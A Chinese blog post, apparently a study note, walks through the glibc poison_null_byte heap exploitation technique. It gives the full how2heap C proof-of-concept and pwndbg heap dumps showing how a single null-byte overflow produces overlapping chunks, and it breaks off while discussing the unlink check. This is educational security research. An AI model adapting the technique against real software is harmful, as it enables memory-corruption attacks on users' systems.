<!DOCTYPE html><html lang="en" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>how2heap(6)-poison_null_byte | Hexo</title><meta name="author" content="John Doe"><meta name="copyright" content="John Doe"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="referrer" content="no-referrer"><meta name="description" content="简介poison_null_byte 和 off-by-one 本质都是相同的只是名字不同罢了，这里我们再结合 libc-2.27.so 和 free 源码再来仔细的看一下。这里再多说几句，poison_null_byte 的本质是 malloc 滥用向前合并和向后合并造成的，其最核心的东西是 mchunk_size 中的 PREV_INUSE 和 mchunk_prev_size。 漏洞影响版本">
<meta property="og:type" content="article">
<meta property="og:title" content="how2heap(6)-poison_null_byte">
<meta property="og:url" content="http://example.com/2021/04/28/how2heap(6)-poison_null_byte/index.html">
<meta property="og:site_name" content="Hexo">
<meta property="og:description" content="简介poison_null_byte 和 off-by-one 本质都是相同的只是名字不同罢了，这里我们再结合 libc-2.27.so 和 free 源码再来仔细的看一下。这里再多说几句，poison_null_byte 的本质是 malloc 滥用向前合并和向后合并造成的，其最核心的东西是 mchunk_size 中的 PREV_INUSE 和 mchunk_prev_size。 漏洞影响版本">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg">
<meta property="article:published_time" content="2021-04-28T12:11:15.000Z">
<meta property="article:modified_time" content="2021-07-04T09:57:12.172Z">
<meta property="article:author" content="John Doe">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://example.com/2021/04/28/how2heap(6)-poison_null_byte/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: 'Copy successfully',
    error: 'Copy error',
    noSupport: 'The browser does not support'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  date_suffix: {
    just: 'Just',
    min: 'minutes ago',
    hour: 'hours ago',
    day: 'days ago',
    month: 'months ago'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  source: {
    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js',
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
    },
    fancybox: {
      js: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js',
      css: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isanchor: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'how2heap(6)-poison_null_byte',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2021-07-04 17:57:12'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          if (t === 'dark') activateDarkMode()
          else if (t === 'light') activateLightMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
    const detectApple = () => {
      if (GLOBAL_CONFIG_SITE.isHome && /iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
    })(window)</script><meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
</head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">317</div></a></div></div></div><hr/></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">Hexo</a></span><div id="menus"><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">how2heap(6)-poison_null_byte</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2021-04-28T12:11:15.000Z" title="Created 2021-04-28 20:11:15">2021-04-28</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2021-07-04T09:57:12.172Z" title="Updated 2021-07-04 17:57:12">2021-07-04</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="how2heap(6)-poison_null_byte"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post View:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>poison_null_byte 和 off-by-one 本质都是相同的只是名字不同罢了，这里我们再结合 libc-2.27.so 和 free 源码再来仔细的看一下。这里再多说几句，poison_null_byte 的本质是 malloc 滥用向前合并和向后合并造成的，其最核心的东西是 mchunk_size 中的 PREV_INUSE 和 mchunk_prev_size。</p>
<h1 id="漏洞影响版本"><a href="#漏洞影响版本" class="headerlink" title="漏洞影响版本"></a>漏洞影响版本</h1><p>所有 glibc malloc 版本</p>
<h1 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h1><h2 id="POC-源码"><a href="#POC-源码" class="headerlink" title="POC 源码"></a>POC 源码</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;malloc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	setbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>);</span><br><span class="line">	setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Welcome to poison null byte 2.0!\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Tested in Ubuntu 18.04 64bit.\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;This technique can be used when you have an off-by-one into a malloc&#x27;ed region with a null byte.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">uint8_t</span>* a;</span><br><span class="line">	<span class="keyword">uint8_t</span>* b;</span><br><span class="line">	<span class="keyword">uint8_t</span>* c;</span><br><span class="line">	<span class="keyword">uint8_t</span>* b1;</span><br><span class="line">	<span class="keyword">uint8_t</span>* b2;</span><br><span class="line">	<span class="keyword">uint8_t</span>* d;</span><br><span class="line">	<span class="keyword">void</span> *barrier;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;We allocate 0x500 bytes for &#x27;a&#x27;.\n&quot;</span>);</span><br><span class="line">	a = (<span class="keyword">uint8_t</span>*) <span class="built_in">malloc</span>(<span class="number">0x500</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;a: %p\n&quot;</span>, a);</span><br><span class="line">	<span class="keyword">int</span> real_a_size = malloc_usable_size(a);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Since we want to overflow &#x27;a&#x27;, we need to know the &#x27;real&#x27; size of &#x27;a&#x27; &quot;</span></span><br><span class="line">		<span class="string">&quot;(it may be more than 0x500 because of rounding): %#x\n&quot;</span>, real_a_size);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* chunk size attribute cannot have a least significant byte with a value of 0x00.</span></span><br><span class="line"><span class="comment">	 * the least significant byte of this will be 0x10, because the size of the chunk includes</span></span><br><span class="line"><span class="comment">	 * the amount requested plus some amount required for the metadata. */</span></span><br><span class="line">	b = (<span class="keyword">uint8_t</span>*) <span class="built_in">malloc</span>(<span class="number">0xa00</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;b: %p\n&quot;</span>, b);</span><br><span class="line"></span><br><span class="line">	c = (<span class="keyword">uint8_t</span>*) <span class="built_in">malloc</span>(<span class="number">0x500</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;c: %p\n&quot;</span>, c);</span><br><span class="line"></span><br><span class="line">	barrier =  <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;We allocate a barrier at %p, so that c is not consolidated with the top-chunk when freed.\n&quot;</span></span><br><span class="line">		<span class="string">&quot;The barrier is not strictly necessary, but makes things less confusing\n&quot;</span>, barrier);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">uint64_t</span>* b_size_ptr = (<span class="keyword">uint64_t</span>*)(b - <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// added fix for size==prev_size(next_chunk) check in newer versions of glibc</span></span><br><span class="line">	<span class="comment">// https://sourceware.org/git/?p=glibc.git;a=commitdiff;h=17f487b7afa7cd6c316040f3e6c86dc96b2eec30</span></span><br><span class="line">	<span class="comment">// this added check requires we are allowed to have null pointers in b (not just a c string)</span></span><br><span class="line">	<span class="comment">//*(size_t*)(b+0x9f0) = 0xa00;</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;In newer versions of glibc we will need to have our updated size inside b itself to pass &quot;</span></span><br><span class="line">		<span class="string">&quot;the check &#x27;chunksize(P) != prev_size (next_chunk(P))&#x27;\n&quot;</span>);</span><br><span class="line">	<span class="comment">// we set this location to 0xa00 since 0xa00 == (0xa11 &amp; 0xff00)</span></span><br><span class="line">	<span class="comment">// which is the value of b.size after its first byte has been overwritten with a NULL byte</span></span><br><span class="line">	*(<span class="keyword">size_t</span>*)(b+<span class="number">0x9f0</span>) = <span class="number">0xa00</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// this technique works by overwriting the size metadata of a free chunk</span></span><br><span class="line">	<span class="built_in">free</span>(b);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;b.size: %#lx\n&quot;</span>, *b_size_ptr);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;b.size is: (0xa00 + 0x10) | prev_in_use\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;We overflow &#x27;a&#x27; with a single null byte into the metadata of &#x27;b&#x27;\n&quot;</span>);</span><br><span class="line">	a[real_a_size] = <span class="number">0</span>; <span class="comment">// &lt;--- THIS IS THE &quot;EXPLOITED BUG&quot;</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;b.size: %#lx\n&quot;</span>, *b_size_ptr);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">uint64_t</span>* c_prev_size_ptr = ((<span class="keyword">uint64_t</span>*)c)<span class="number">-2</span>;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;c.prev_size is %#lx\n&quot;</span>,*c_prev_size_ptr);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// This malloc will result in a call to unlink on the chunk where b was.</span></span><br><span class="line">	<span class="comment">// The added check (commit id: 17f487b), if not properly handled as we did before,</span></span><br><span class="line">	<span class="comment">// will detect the heap corruption now.</span></span><br><span class="line">	<span class="comment">// The check is this: chunksize(P) != prev_size (next_chunk(P)) where</span></span><br><span class="line">	<span class="comment">// P == b-0x10, chunksize(P) == *(b-0x10+0x8) == 0xa00 (was 0xa10 before the overflow)</span></span><br><span class="line">	<span class="comment">// next_chunk(P) == b-0x10+0xa00 == b+0x9f0</span></span><br><span class="line">	<span class="comment">// prev_size (next_chunk(P)) == *(b+0x9f0) == 0xa00</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;We will pass the check since chunksize(P) == %#lx == %#lx == prev_size (next_chunk(P))\n&quot;</span>,</span><br><span class="line">		*((<span class="keyword">size_t</span>*)(b<span class="number">-0x8</span>)), *(<span class="keyword">size_t</span>*)(b<span class="number">-0x10</span> + *((<span class="keyword">size_t</span>*)(b<span class="number">-0x8</span>))));</span><br><span class="line">	b1 = <span class="built_in">malloc</span>(<span class="number">0x500</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;b1: %p\n&quot;</span>,b1);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Now we malloc &#x27;b1&#x27;. It will be placed where &#x27;b&#x27; was. &quot;</span></span><br><span class="line">		<span class="string">&quot;At this point c.prev_size should have been updated, but it was not: %#lx\n&quot;</span>,*c_prev_size_ptr);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Interestingly, the updated value of c.prev_size has been written 0x10 bytes &quot;</span></span><br><span class="line">		<span class="string">&quot;before c.prev_size: %lx\n&quot;</span>,*(((<span class="keyword">uint64_t</span>*)c)<span class="number">-4</span>));</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;We malloc &#x27;b2&#x27;, our &#x27;victim&#x27; chunk.\n&quot;</span>);</span><br><span class="line">	<span class="comment">// Typically b2 (the victim) will be a structure with valuable pointers that we want to control</span></span><br><span class="line"></span><br><span class="line">	b2 = <span class="built_in">malloc</span>(<span class="number">0x480</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;b2: %p\n&quot;</span>,b2);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">memset</span>(b2,<span class="string">&#x27;B&#x27;</span>,<span class="number">0x480</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Current b2 content:\n%s\n&quot;</span>,b2);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Now we free &#x27;b1&#x27; and &#x27;c&#x27;: this will consolidate the chunks &#x27;b1&#x27; and &#x27;c&#x27; (forgetting about &#x27;b2&#x27;).\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">free</span>(b1);</span><br><span class="line">	<span class="built_in">free</span>(c);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Finally, we allocate &#x27;d&#x27;, overlapping &#x27;b2&#x27;.\n&quot;</span>);</span><br><span class="line">	d = <span class="built_in">malloc</span>(<span class="number">0xc00</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;d: %p\n&quot;</span>,d);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Now &#x27;d&#x27; and &#x27;b2&#x27; overlap.\n&quot;</span>);</span><br><span class="line">	<span class="built_in">memset</span>(d,<span class="string">&#x27;D&#x27;</span>,<span class="number">0xc00</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;New b2 content:\n%s\n&quot;</span>,b2);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Thanks to https://www.contextis.com/resources/white-papers/glibc-adventures-the-forgotten-chunks&quot;</span></span><br><span class="line">		<span class="string">&quot;for the clear explanation of this technique.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	assert(<span class="built_in">strstr</span>(b2, <span class="string">&quot;DDDDDDDDDDDD&quot;</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>编译命令：gcc -g poison_null_byte.c -o poison_null_byte</p>
</blockquote>
<h2 id="POC-分析"><a href="#POC-分析" class="headerlink" title="POC 分析"></a>POC 分析</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;We allocate 0x500 bytes for &#x27;a&#x27;.\n&quot;</span>);</span><br><span class="line">a = (<span class="keyword">uint8_t</span>*) <span class="built_in">malloc</span>(<span class="number">0x500</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;a: %p\n&quot;</span>, a);</span><br><span class="line"><span class="keyword">int</span> real_a_size = malloc_usable_size(a);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Since we want to overflow &#x27;a&#x27;, we need to know the &#x27;real&#x27; size of &#x27;a&#x27; &quot;</span></span><br><span class="line">	<span class="string">&quot;(it may be more than 0x500 because of rounding): %#x\n&quot;</span>, real_a_size);</span><br></pre></td></tr></table></figure>

<p>编译之后对 POC 源码的 36 行下断点然后开始调试，程序会执行完上述代码，结果如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">250</span>gx <span class="number">0x555555757000</span></span><br><span class="line"><span class="number">0x555555757000</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000251</span> #tcache_perthread_struct</span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555757250</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000511</span> <span class="meta">#a(malloc)</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555757760</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x00000000000208a1</span> #top_chunk</span><br><span class="line">......</span><br><span class="line"><span class="number">0x5555557577c0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line">pwndbg&gt; p/<span class="function">x <span class="title">malloc_usable_size</span><span class="params">(a)</span>  <span class="comment">//malloc使用的大小</span></span></span><br><span class="line"><span class="function">$2 </span>= <span class="number">0x508</span></span><br><span class="line">pwndbg&gt; p/x real_a_size</span><br><span class="line">$<span class="number">3</span> = <span class="number">0x508</span></span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>malloc_usable_size(a) //malloc 使用的大小<br>这里不探讨这个函数，感兴趣可以在 malloc.c 中找到其源码</p>
</blockquote>
<p>这里调用 malloc 创建了对齐后大小为 0x511 的堆块，接下来执行下述代码(b 47-&gt;c)：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">b = (<span class="keyword">uint8_t</span>*) <span class="built_in">malloc</span>(<span class="number">0xa00</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;b: %p\n&quot;</span>, b);</span><br><span class="line"></span><br><span class="line">c = (<span class="keyword">uint8_t</span>*) <span class="built_in">malloc</span>(<span class="number">0x500</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;c: %p\n&quot;</span>, c);</span><br><span class="line"></span><br><span class="line">barrier =  <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;We allocate a barrier at %p, so that c is not consolidated with the top-chunk when freed.\n&quot;</span></span><br><span class="line">	<span class="string">&quot;The barrier is not strictly necessary, but makes things less confusing\n&quot;</span>, barrier);</span><br><span class="line"><span class="keyword">uint64_t</span>* b_size_ptr = (<span class="keyword">uint64_t</span>*)(b - <span class="number">8</span>);</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">800</span>gx <span class="number">0x555555757000</span></span><br><span class="line"><span class="number">0x555555757000</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000251</span> #tcache_perthread_struct</span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555757250</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000511</span> <span class="meta">#a(malloc)</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555757760</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000a11</span> <span class="meta">#b(malloc)</span></span><br><span class="line">    								<span class="comment">//b_size_ptr==0x555555757768</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555758170</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000511</span> <span class="meta">#c(malloc)</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555758680</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000111</span> <span class="meta">#barrier(malloc)</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555758790</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x000000000001f871</span> #top_chunk</span><br><span class="line">......</span><br><span class="line"><span class="number">0x5555557588f0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure>

<p>barrier 防止在释放时堆块和 top_chunk 合并，体现了这个堆块的名字–barrier（屏障）。接下来修改堆块：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// added fix for size==prev_size(next_chunk) check in newer versions of glibc</span></span><br><span class="line"><span class="comment">// https://sourceware.org/git/?p=glibc.git;a=commitdiff;h=17f487b7afa7cd6c316040f3e6c86dc96b2eec30</span></span><br><span class="line"><span class="comment">// this added check requires we are allowed to have null pointers in b (not just a c string)</span></span><br><span class="line"><span class="comment">//*(size_t*)(b+0x9f0) = 0xa00;</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;In newer versions of glibc we will need to have our updated size inside b itself to pass &quot;</span></span><br><span class="line">	<span class="string">&quot;the check &#x27;chunksize(P) != prev_size (next_chunk(P))&#x27;\n&quot;</span>);</span><br><span class="line"><span class="comment">// we set this location to 0xa00 since 0xa00 == (0xa11 &amp; 0xff00)</span></span><br><span class="line"><span class="comment">// which is the value of b.size after its first byte has been overwritten with a NULL byte</span></span><br><span class="line">*(<span class="keyword">size_t</span>*)(b+<span class="number">0x9f0</span>) = <span class="number">0xa00</span>;</span><br></pre></td></tr></table></figure>

<p>POC 注释中提到了在 glibc 后续版本中对 unlink 添加了一些检查机制，如下图所示：<br><img src="https://cdn.nlark.com/yuque/0/2021/png/574026/1620020304639-b3024cef-8e59-42ac-a926-033f8a98652d.png#clientId=ucb4443ff-3664-4&from=paste&height=213&id=ub61b4991&margin=%5Bobject%20Object%5D&name=image.png&originHeight=426&originWidth=1626&originalType=binary&size=90993&status=done&style=none&taskId=u39330404-b302-48c9-9f9f-e80fceeb63b&width=813" alt="image.png"><br>可以看到，在 unlink 的代码最前面添加了对 p 和 nextchunk 的检查：</p>
